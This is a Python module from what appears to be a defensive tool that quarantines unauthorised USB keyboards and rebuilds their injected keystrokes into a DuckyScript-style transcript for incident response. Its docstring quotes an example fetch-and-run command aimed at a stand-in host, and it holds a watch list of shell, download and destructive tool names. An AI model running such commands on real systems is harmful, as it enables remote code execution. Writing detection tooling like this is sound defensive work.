"""
Payload extraction: what the device was TRYING to do.

Because keystrokes are captured inside the quarantine and never reach the
session, there is no reason to stop the attack early. Existing tools cut the
device off after a threshold of suspicious keys and unbind it -- which defends
the machine but destroys the evidence. Nobody ever learns what the attacker
wanted.

Here the payload is allowed to type itself out in full, into a closed room, and
is reconstructed afterwards. The result is not "a suspicious device was
blocked" but "the device attempted to run: curl http://x.example/s | bash".
That is an incident response artifact.

PRIVACY, STRUCTURALLY
---------------------
This module can only ever see devices that have never been authorized:

  - devices already attached at startup are recorded in a baseline and never
    inspected at all
  - quarantine runs strictly BEFORE the human decision
  - once a device is authorized the grab is released and never retaken

So there is no configuration, bug, or command-line flag that points this at a
keyboard someone is actually using. On top of that structural property, key
codes are discarded entirely unless capture was explicitly requested; timing
analysis works on timestamps alone.

LAYOUT CAVEAT
-------------
A USB keyboard sends scancodes, not characters. Translating them to text
requires assuming a layout, and this module assumes US QWERTY. A payload
written for a different layout will be reconstructed as mojibake -- which is
itself informative, but the transcript must not be read as authoritative text.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional, Sequence, Tuple

# Modifier keycodes, tracked by press/release so that shifted characters and
# chords such as GUI+r can be reconstructed.
MOD_LEFTCTRL, MOD_RIGHTCTRL = 29, 97
MOD_LEFTSHIFT, MOD_RIGHTSHIFT = 42, 54
MOD_LEFTALT, MOD_RIGHTALT = 56, 100
MOD_LEFTMETA, MOD_RIGHTMETA = 125, 126

CTRL = {MOD_LEFTCTRL, MOD_RIGHTCTRL}
SHIFT = {MOD_LEFTSHIFT, MOD_RIGHTSHIFT}
ALT = {MOD_LEFTALT, MOD_RIGHTALT}
META = {MOD_LEFTMETA, MOD_RIGHTMETA}
MODIFIERS = CTRL | SHIFT | ALT | META

# US QWERTY: (unshifted, shifted)
KEYMAP = {
    2: ("1", "!"), 3: ("2", "@"), 4: ("3", "#"), 5: ("4", "$"), 6: ("5", "%"),
    7: ("6", "^"), 8: ("7", "&"), 9: ("8", "*"), 10: ("9", "("), 11: ("0", ")"),
    12: ("-", "_"), 13: ("=", "+"),
    16: ("q", "Q"), 17: ("w", "W"), 18: ("e", "E"), 19: ("r", "R"),
    20: ("t", "T"), 21: ("y", "Y"), 22: ("u", "U"), 23: ("i", "I"),
    24: ("o", "O"), 25: ("p", "P"), 26: ("[", "{"), 27: ("]", "}"),
    30: ("a", "A"), 31: ("s", "S"), 32: ("d", "D"), 33: ("f", "F"),
    34: ("g", "G"), 35: ("h", "H"), 36: ("j", "J"), 37: ("k", "K"),
    38: ("l", "L"), 39: (";", ":"), 40: ("'", '"'), 41: ("`", "~"),
    43: ("\\", "|"),
    44: ("z", "Z"), 45: ("x", "X"), 46: ("c", "C"), 47: ("v", "V"),
    48: ("b", "B"), 49: ("n", "N"), 50: ("m", "M"),
    51: (",", "<"), 52: (".", ">"), 53: ("/", "?"),
    57: (" ", " "),
}

# Keys that are actions rather than text, named as DuckyScript names them so
# the transcript reads like the script the attacker probably wrote.
NAMED_KEYS = {
    1: "ESCAPE", 14: "BACKSPACE", 15: "TAB", 28: "ENTER",
    102: "HOME", 103: "UP", 104: "PAGEUP", 105: "LEFT", 106: "RIGHT",
    107: "END", 108: "DOWN", 109: "PAGEDOWN", 110: "INSERT", 111: "DELETE",
    58: "CAPSLOCK",
}
for _n in range(10):
    NAMED_KEYS[59 + _n] = f"F{_n + 1}"

# Tokens whose presence in a reconstructed payload is worth saying out loud.
# Not a detection mechanism -- the device already failed for typing at all --
# but it tells the operator what kind of incident this is.
SUSPICIOUS_TOKENS = (
    "powershell", "cmd.exe", "/bin/sh", "/bin/bash", "bash", "curl", "wget",
    "iwr", "invoke-webrequest", "invoke-expression", "iex", "base64",
    "certutil", "bitsadmin", "nc ", "ncat", "chmod +x", "sudo", "rm -rf",
    "reg add", "schtasks", "crontab", "systemctl", "http://", "https://",
)


@dataclass
class Payload:
    """A reconstructed transcript."""
    lines: List[str] = field(default_factory=list)
    text: str = ""
    keystrokes: int = 0
    truncated: bool = False

    def suspicious_tokens(self) -> List[str]:
        low = self.text.lower()
        return [t for t in SUSPICIOUS_TOKENS if t in low]

    def as_script(self) -> str:
        return "\n".join(self.lines)


def _modifier_names(active) -> List[str]:
    names = []
    if active & CTRL:
        names.append("CTRL")
    if active & SHIFT:
        names.append("SHIFT")
    if active & ALT:
        names.append("ALT")
    if active & META:
        names.append("GUI")
    return names


def reconstruct(raw_events: Sequence[Tuple[float, int, int]],
                max_chars: int = 4096) -> Payload:
    """
    Rebuild a DuckyScript-style transcript from (offset, code, value) events.

    value 1 is press, 0 release, 2 auto-repeat. Repeats are ignored: they say
    a key was held, not that it was struck again, and counting them would
    corrupt both the transcript and the keystroke count.
    """
    payload = Payload()
    active: set = set()
    buffer: List[str] = []
    # Everything emitted so far, across every flushed line AND the line being
    # built. The old bound compared max_chars against len(payload.text) --
    # which is empty until the very last statement of this function -- plus the
    # CURRENT buffer, so flush() reset it to zero. A device that types a
    # newline every few characters therefore never hit the limit at all: 20 000
    # keystrokes produced 4 000 lines with truncated=False. The cap existed to
    # bound what a hostile HID can make the daemon hold in memory, and a cap a
    # payload can reset by pressing ENTER is not a cap.
    emitted = 0

    def flush():
        nonlocal emitted
        if buffer:
            payload.lines.append("STRING " + "".join(buffer))
            emitted += len(buffer)
            buffer.clear()

    for _offset, code, value in raw_events:
        if code in MODIFIERS:
            if value == 1:
                active.add(code)
            elif value == 0:
                active.discard(code)
            continue

        if value != 1:
            continue

        payload.keystrokes += 1
        # keystrokes is still counted past the limit: how MUCH the device typed
        # is a finding in its own right, and it costs one integer to keep.
        if emitted + len(buffer) >= max_chars:
            payload.truncated = True
            continue

        mods = _modifier_names(active)

        # A chord (CTRL+C, GUI+r) is an action, so the text run ends here.
        if mods and not (mods == ["SHIFT"]):
            flush()
            key = NAMED_KEYS.get(code) or (KEYMAP.get(code, ("?", "?"))[0]).upper()
            line = " ".join(mods + [key])
            payload.lines.append(line)
            emitted += len(line)
            continue

        if code in NAMED_KEYS:
            flush()
            payload.lines.append(NAMED_KEYS[code])
            emitted += len(NAMED_KEYS[code])
            continue

        mapping = KEYMAP.get(code)
        if mapping is None:
            flush()
            payload.lines.append(f"KEY_{code}")
            emitted += len(f"KEY_{code}")
            continue

        buffer.append(mapping[1] if (active & SHIFT) else mapping[0])

    flush()
    payload.text = " ".join(
        line[len("STRING "):] for line in payload.lines
        if line.startswith("STRING ")
    )
    return payload


def reconstruct_observation(obs) -> Optional[Payload]:
    """Convenience wrapper. Returns None when capture was not enabled."""
    if not getattr(obs, "capture", False) or not obs.raw_events:
        return None
    return reconstruct(obs.raw_events)
